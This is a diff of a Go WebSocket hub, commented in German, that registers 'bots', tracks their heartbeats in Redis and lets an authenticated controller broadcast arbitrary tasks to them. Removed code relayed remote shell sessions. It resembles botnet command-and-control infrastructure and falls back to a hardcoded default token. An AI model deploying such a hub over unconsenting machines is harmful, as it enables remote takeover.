@@ -1,376 +1,347 @@
 package main
 
 import (
-	"context"
-	"fmt"
-	"log"
-	"net/http"
-	"os"
-	"strings"
-	"sync"
-	"time"
+    "context"
+    "fmt"
+    "log"
+    "net/http"
+    "os"
+    "strings"
+    "sync"
+    "time"
 
-	"github.com/go-redis/redis/v8"
-	"nhooyr.io/websocket"
-	"nhooyr.io/websocket/wsjson"
+    "github.com/go-redis/redis/v8"
+    "nhooyr.io/websocket"
+    "nhooyr.io/websocket/wsjson"
 )
 
 var (
-	authToken = os.Getenv("AUTH_TOKEN")
-	redisAddr = os.Getenv("REDIS_URL")
+    authToken string
+    redisAddr string
+    serverPort = ":8080"
 )
 
 type Client struct {
-	conn *websocket.Conn
-	ctx  context.Context
-	id   string
-	typ  string
-	mu   sync.Mutex
+    conn *websocket.Conn
+    ctx  context.Context
+    id   string
+    typ  string // "client" oder "controller"
+    mu   sync.Mutex
 }
 
 type Hub struct {
-	mu         sync.RWMutex
-	clients    map[string]*Client
-	register   chan *Client
-	unregister chan *Client
-	redis      *redis.Client
-}
-
-type ShellSession struct {
-	controller *Client
-	client     *Client
+    mu         sync.RWMutex
+    clients    map[string]*Client
+    register   chan *Client
+    unregister chan *Client
+    redis      *redis.Client
 }
 
 var (
-	hub           *Hub
-	shellSessions sync.Map
+    hub           *Hub
+    shellSessions sync.Map
 )
 
 func main() {
-	if authToken == "" {
-		authToken = "geheim123" // Fallback
-	}
-	if redisAddr == "" {
-		redisAddr = "localhost:6379"
-	}
+    authToken = os.Getenv("AUTH_TOKEN")
+    redisAddr = os.Getenv("REDIS_URL")
+    port := os.Getenv("SERVER_PORT")
 
-	hub = &Hub{
-		clients:    make(map[string]*Client),
-		register:   make(chan *Client),
-		unregister: make(chan *Client),
-		redis: redis.NewClient(&redis.Options{
-			Addr: redisAddr,
-		}),
-	}
+    if authToken == "" {
+        authToken = "change_me_please_secure_token_123"
+        log.Println("⚠️  WARNUNG: AUTH_TOKEN nicht gesetzt! Verwende unsicheren Default.")
+    }
+    if redisAddr == "" {
+        redisAddr = "localhost:6379"
+    }
+    if port != "" {
+        serverPort = ":" + port
+    }
 
-	// Redis-Verbindung testen
-	ctx := context.Background()
-	if err := hub.redis.Ping(ctx).Err(); err != nil {
-		log.Printf("Warnung: Redis nicht erreichbar: %v", err)
-	} else {
-		log.Println("Redis verbunden")
-	}
+    hub = &Hub{
+        clients:    make(map[string]*Client),
+        register:   make(chan *Client),
+        unregister: make(chan *Client),
+        redis: redis.NewClient(&redis.Options{
+            Addr:       redisAddr,
+            DB:         0,
+            MaxRetries: 5,
+        }),
+    }
 
-	go hub.run()
+    // Redis Test
+    ctx := context.Background()
+    if err := hub.redis.Ping(ctx).Err(); err != nil {
+        log.Printf("❌ Redis nicht erreichbar: %v", err)
+    } else {
+        log.Println("✅ Redis verbunden")
+    }
 
-	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
-		c, err := websocket.Accept(w, r, nil)
-		if err != nil {
-			log.Println("WebSocket Accept Fehler:", err)
-			return
-		}
-		client := &Client{
-			conn: c,
-			ctx:  context.Background(), // Wichtig: nicht r.Context() verwenden!
-		}
-		go handleClient(client)
-	})
+    go hub.run()
+    go hub.cleanupInactiveBots() // Neuer Cleanup-Goroutine
 
-	log.Println("Mesh Server startet auf :8080")
-	log.Fatal(http.ListenAndServe(":8080", nil))
+    http.HandleFunc("/ws", handleWebSocket)
+
+    log.Printf("🚀 MeshCompute Server läuft auf http://0.0.0.0%s", serverPort)
+    log.Fatal(http.ListenAndServe(serverPort, nil))
+}
+
+func handleWebSocket(w http.ResponseWriter, r *http.Request) {
+    c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
+        CompressionMode: websocket.CompressionDisabled,
+    })
+    if err != nil {
+        log.Println("WebSocket Accept Fehler:", err)
+        return
+    }
+
+    client := &Client{
+        conn: c,
+        ctx:  context.Background(),
+    }
+    go handleClient(client)
 }
 
 func (h *Hub) run() {
-	for {
-		select {
-		case client := <-h.register:
-			h.mu.Lock()
-			h.clients[client.id] = client
-			h.mu.Unlock()
-			log.Printf("Client registriert: %s (Typ: %s)", client.id, client.typ)
+    for {
+        select {
+        case client := <-h.register:
+            h.mu.Lock()
+            h.clients[client.id] = client
+            h.mu.Unlock()
+            log.Printf("✅ Registriert: %s (Typ: %s)", client.id, client.typ)
 
-		case client := <-h.unregister:
-			h.mu.Lock()
-			if _, ok := h.clients[client.id]; ok {
-				delete(h.clients, client.id)
-				log.Printf("Client entfernt: %s", client.id)
-			}
-			h.mu.Unlock()
-		}
-	}
+        case client := <-h.unregister:
+            h.mu.Lock()
+            delete(h.clients, client.id)
+            h.mu.Unlock()
+            log.Printf("❌ Entfernt: %s", client.id)
+        }
+    }
+}
+
+// Periodisches Cleanup alter Bots
+func (h *Hub) cleanupInactiveBots() {
+    ticker := time.NewTicker(60 * time.Second)
+    defer ticker.Stop()
+
+    for range ticker.C {
+        ctx := context.Background()
+        now := time.Now().Unix()
+
+        keys, err := h.redis.Keys(ctx, "bot:*").Result()
+        if err != nil {
+            continue
+        }
+
+        for _, key := range keys {
+            tsStr, _ := h.redis.HGet(ctx, key, "heartbeat").Result()
+            var ts int64
+            fmt.Sscanf(tsStr, "%d", &ts)
+
+            if now-ts > 180 { // > 3 Minuten offline
+                botID := strings.TrimPrefix(key, "bot:")
+                h.redis.Del(ctx, key)
+                h.redis.SRem(ctx, "active_bots", botID)
+                log.Printf("🧹 Inaktiver Bot entfernt: %s", botID)
+            }
+        }
+    }
 }
 
 func handleClient(c *Client) {
-	defer c.conn.Close(websocket.StatusInternalError, "Verbindung geschlossen")
+    defer func() {
+        c.conn.Close(websocket.StatusInternalError, "")
+        if c.typ == "client" {
+            hub.unregister <- c
+            hub.redis.SRem(context.Background(), "active_bots", c.id)
+            hub.redis.Del(context.Background(), "bot:"+c.id)
+        }
+    }()
 
-	// Initiale Authentifizierung
-	var initMsg struct {
-		Type      string `json:"type"`
-		AuthToken string `json:"auth_token,omitempty"`
-		BotID     string `json:"bot_id,omitempty"`
-	}
-	if err := wsjson.Read(c.ctx, c.conn, &initMsg); err != nil {
-		log.Println("Init-Fehler:", err)
-		return
-	}
+    // Initiale Nachricht lesen
+    var initMsg struct {
+        Type      string `json:"type"`
+        AuthToken string `json:"auth_token,omitempty"`
+        BotID     string `json:"bot_id,omitempty"`
+    }
 
-	// Controller muss sich authentifizieren
-	if initMsg.Type == "controller" && initMsg.AuthToken != authToken {
-		log.Println("Ungültiger Auth-Token für Controller")
-		return
-	}
+    if err := wsjson.Read(c.ctx, c.conn, &initMsg); err != nil {
+        log.Println("Init-Fehler:", err)
+        return
+    }
 
-	c.typ = initMsg.Type
-	if c.typ == "client" {
-		c.id = initMsg.BotID
-		hub.redis.SAdd(c.ctx, "active_bots", c.id)
-		hub.redis.HSet(c.ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
-	} else {
-		c.id = fmt.Sprintf("controller-%d", time.Now().UnixNano())
-	}
+    if initMsg.Type == "controller" {
+        if initMsg.AuthToken != authToken {
+            log.Println("❌ Ungültiger Auth-Token für Controller")
+            return
+        }
+        c.typ = "controller"
+        c.id = fmt.Sprintf("ctrl_%d", time.Now().UnixNano())
+    } else if initMsg.Type == "client" {
+        if initMsg.BotID == "" {
+            log.Println("❌ Client ohne BotID")
+            return
+        }
+        c.typ = "client"
+        c.id = initMsg.BotID
 
-	hub.register <- c
-	defer func() {
-		hub.unregister <- c
-		if c.typ == "client" {
-			hub.redis.SRem(c.ctx, "active_bots", c.id)
-			hub.redis.Del(c.ctx, "bot:"+c.id)
-		}
-	}()
+        ctx := context.Background()
+        hub.redis.SAdd(ctx, "active_bots", c.id)
+        hub.redis.HSet(ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
+    } else {
+        log.Println("Unbekannter Typ:", initMsg.Type)
+        return
+    }
 
-	// Heartbeat-Ticker für Clients
-	if c.typ == "client" {
-		go func() {
-			ticker := time.NewTicker(10 * time.Second)
-			defer ticker.Stop()
-			for {
-				select {
-				case <-ticker.C:
-					hub.redis.HSet(c.ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
-				case <-c.ctx.Done():
-					return
-				}
-			}
-		}()
-	}
+    hub.register <- c
 
-	// Nachrichten-Schleife
-	for {
-		var msg map[string]interface{}
-		err := wsjson.Read(c.ctx, c.conn, &msg)
-		if err != nil {
-			log.Printf("Lesefehler von %s (typ=%s): %v", c.id, c.typ, err)
-			break
-		}
-		log.Printf("Nachricht von %s: %v", c.id, msg)
-		hub.handleMessage(c, msg)
-	}
+    // Heartbeat für Clients
+    if c.typ == "client" {
+        go heartbeatSender(c)
+    }
+
+    // Haupt-Nachrichtenschleife
+    for {
+        var msg map[string]interface{}
+        if err := wsjson.Read(c.ctx, c.conn, &msg); err != nil {
+            log.Printf("Verbindung zu %s geschlossen: %v", c.id, err)
+            break
+        }
+
+        hub.handleMessage(c, msg)
+    }
+}
+
+func heartbeatSender(c *Client) {
+    ticker := time.NewTicker(15 * time.Second)
+    defer ticker.Stop()
+
+    ctx := context.Background()
+    for range ticker.C {
+        hub.redis.HSet(ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
+    }
 }
 
 func (h *Hub) handleMessage(sender *Client, msg map[string]interface{}) {
-	msgType, _ := msg["type"].(string)
+    msgType, _ := msg["type"].(string)
 
-	switch msgType {
-	case "shell_input":
-		h.handleShellInput(sender, msg)
-	case "shell_output":
-		h.handleShellOutput(sender, msg)
-	case "shell_exit":
-		h.handleShellExit(sender, msg)
-	case "command":
-		if sender.typ == "controller" {
-			h.handleControllerCommand(sender, msg)
-		}
-	case "result":
-		h.forwardToController(sender, msg)
-	default:
-		log.Printf("Unbekannter Nachrichtentyp: %s von %s", msgType, sender.id)
-	}
+    switch msgType {
+    case "command":
+        if sender.typ == "controller" {
+            h.handleControllerCommand(sender, msg)
+        }
+    case "result":
+        h.forwardToController(sender, msg)
+    case "shell_input", "shell_output", "shell_exit":
+        // Shell-Sessions (falls du sie später brauchst)
+        h.handleShellMessage(sender, msg)
+    default:
+        log.Printf("Unbekannter Typ '%s' von %s", msgType, sender.id)
+    }
 }
 
 func (h *Hub) handleControllerCommand(sender *Client, msg map[string]interface{}) {
-	action, _ := msg["action"].(string)
-	target, _ := msg["target"].(string)
-	payload, _ := msg["payload"].(string)
-	taskID, _ := msg["task_id"].(string)
+    action, _ := msg["action"].(string)
+    target, _ := msg["target"].(string)
+    payload, _ := msg["payload"].(string)
+    taskID, _ := msg["task_id"].(string)
 
-	if action == "shell" {
-		h.startShellSession(sender, target)
-		return
-	}
+    if action == "list" {
+        h.sendBotList(sender)
+        return
+    }
 
-	if action == "list" {
-		h.sendBotList(sender)
-		return
-	}
+    task := map[string]interface{}{
+        "task_id": taskID,
+        "action":  action,
+        "target":  target,
+        "payload": payload,
+    }
 
-	task := map[string]interface{}{
-		"task_id": taskID,
-		"action":  action,
-		"target":  target,
-		"payload": payload,
-	}
+    h.mu.RLock()
+    targetFound := false
+    for id, client := range h.clients {
+        if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
+            targetFound = true
+            if err := wsjson.Write(client.ctx, client.conn, task); err != nil {
+                log.Printf("Fehler beim Senden an %s", id)
+            }
+        }
+    }
+    h.mu.RUnlock()
 
-	h.mu.RLock()
-	targetFound := false
-	for id, client := range h.clients {
-		if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
-			targetFound = true
-			wsjson.Write(client.ctx, client.conn, task)
-		}
-	}
-	h.mu.RUnlock()
-
-	confirmMsg := map[string]interface{}{
-		"type":    "info",
-		"message": fmt.Sprintf("Aufgabe %s an %s gesendet", action, target),
-	}
-	if !targetFound && target != "all" {
-		confirmMsg["message"] = fmt.Sprintf("Ziel '%s' nicht gefunden", target)
-	}
-	wsjson.Write(sender.ctx, sender.conn, confirmMsg)
+    // Bestätigung an Controller
+    confirm := map[string]interface{}{
+        "type":    "info",
+        "message": fmt.Sprintf("Aufgabe %s an %s gesendet", action, target),
+    }
+    if !targetFound && target != "all" {
+        confirm["message"] = fmt.Sprintf("Kein Bot gefunden mit ID/Prefix: %s", target)
+    }
+    wsjson.Write(sender.ctx, sender.conn, confirm)
 }
 
 func (h *Hub) sendBotList(controller *Client) {
-	h.mu.RLock()
-	defer h.mu.RUnlock()
+    h.mu.RLock()
+    defer h.mu.RUnlock()
 
-	type BotInfo struct {
-		BotID       string `json:"bot_id"`
-		Status      string `json:"status"`
-		Hostname    string `json:"hostname"`
-		LastSeenSec int    `json:"last_seen_sec"`
-	}
+    type BotInfo struct {
+        BotID    string `json:"bot_id"`
+        Status   string `json:"status"`
+        Hostname string `json:"hostname"`
+    }
 
-	bots := make([]BotInfo, 0)
-	for id, client := range h.clients {
-		if client.typ == "client" {
-			lastSeen := 0
-			val, err := hub.redis.HGet(context.Background(), "bot:"+id, "heartbeat").Result()
-			if err == nil {
-				var timestamp int64
-				fmt.Sscanf(val, "%d", &timestamp)
-				lastSeen = int(time.Now().Unix() - timestamp)
-			}
-			bots = append(bots, BotInfo{
-				BotID:       id,
-				Status:      "online",
-				Hostname:    id,
-				LastSeenSec: lastSeen,
-			})
-		}
-	}
+    bots := []BotInfo{}
+    ctx := context.Background()
+    now := time.Now().Unix()
 
-	response := map[string]interface{}{
-		"type": "result",
-		"data": map[string]interface{}{
-			"bots": bots,
-		},
-	}
-	wsjson.Write(controller.ctx, controller.conn, response)
-}
+    for id, client := range h.clients {
+        if client.typ != "client" {
+            continue
+        }
 
-func (h *Hub) startShellSession(controller *Client, targetID string) {
-	h.mu.RLock()
-	client, ok := h.clients[targetID]
-	h.mu.RUnlock()
+        lastSeen := 999
+        tsStr, err := h.redis.HGet(ctx, "bot:"+id, "heartbeat").Result()
+        if err == nil {
+            var ts int64
+            fmt.Sscanf(tsStr, "%d", &ts)
+            lastSeen = int(now - ts)
+        }
 
-	if !ok || client.typ != "client" {
-		wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
-			"type":    "shell_started",
-			"message": "Client nicht gefunden",
-		})
-		return
-	}
+        status := "online"
+        if lastSeen > 90 {
+            status = "offline"
+        }
 
-	shellID := fmt.Sprintf("shell_%d", time.Now().UnixNano())
+        bots = append(bots, BotInfo{
+            BotID:    id,
+            Status:   status,
+            Hostname: id,
+        })
+    }
 
-	shellReq := map[string]interface{}{
-		"type":     "shell_request",
-		"shell_id": shellID,
-	}
-	if err := wsjson.Write(client.ctx, client.conn, shellReq); err != nil {
-		wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
-			"type":    "error",
-			"message": "Client nicht erreichbar",
-		})
-		return
-	}
-
-	shellSessions.Store(shellID, &ShellSession{
-		controller: controller,
-		client:     client,
-	})
-
-	wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
-		"type":     "shell_started",
-		"shell_id": shellID,
-		"message":  fmt.Sprintf("Shell auf %s gestartet", targetID),
-	})
-}
-
-func (h *Hub) handleShellInput(sender *Client, msg map[string]interface{}) {
-	shellID, _ := msg["shell_id"].(string)
-	data, _ := msg["data"].(string)
-
-	if session, ok := shellSessions.Load(shellID); ok {
-		s := session.(*ShellSession)
-		if sender.id == s.controller.id {
-			wsjson.Write(s.client.ctx, s.client.conn, map[string]interface{}{
-				"type":     "shell_input",
-				"shell_id": shellID,
-				"data":     data,
-			})
-		}
-	}
-}
-
-func (h *Hub) handleShellOutput(sender *Client, msg map[string]interface{}) {
-	shellID, _ := msg["shell_id"].(string)
-	data, _ := msg["data"].(string)
-
-	if session, ok := shellSessions.Load(shellID); ok {
-		s := session.(*ShellSession)
-		if sender.id == s.client.id {
-			wsjson.Write(s.controller.ctx, s.controller.conn, map[string]interface{}{
-				"type":     "shell_output",
-				"shell_id": shellID,
-				"data":     data,
-			})
-		}
-	}
-}
-
-func (h *Hub) handleShellExit(sender *Client, msg map[string]interface{}) {
-	shellID, _ := msg["shell_id"].(string)
-
-	if session, ok := shellSessions.Load(shellID); ok {
-		s := session.(*ShellSession)
-		wsjson.Write(s.controller.ctx, s.controller.conn, map[string]interface{}{
-			"type":     "shell_exit",
-			"shell_id": shellID,
-		})
-		shellSessions.Delete(shellID)
-	}
+    response := map[string]interface{}{
+        "type": "result",
+        "data": map[string]interface{}{
+            "bots": bots,
+        },
+    }
+    wsjson.Write(controller.ctx, controller.conn, response)
 }
 
 func (h *Hub) forwardToController(sender *Client, msg map[string]interface{}) {
-	h.mu.RLock()
-	defer h.mu.RUnlock()
+    h.mu.RLock()
+    defer h.mu.RUnlock()
 
-	for _, client := range h.clients {
-		if client.typ == "controller" {
-			wsjson.Write(client.ctx, client.conn, msg)
-		}
-	}
+    for _, client := range h.clients {
+        if client.typ == "controller" {
+            wsjson.Write(client.ctx, client.conn, msg)
+        }
+    }
+}
+
+func (h *Hub) handleShellMessage(sender *Client, msg map[string]interface{}) {
+    // Shell-Funktionalität (falls du sie später aktivierst) – vorerst nur Stub
+    log.Printf("Shell-Nachricht von %s: %v", sender.id, msg)
 }
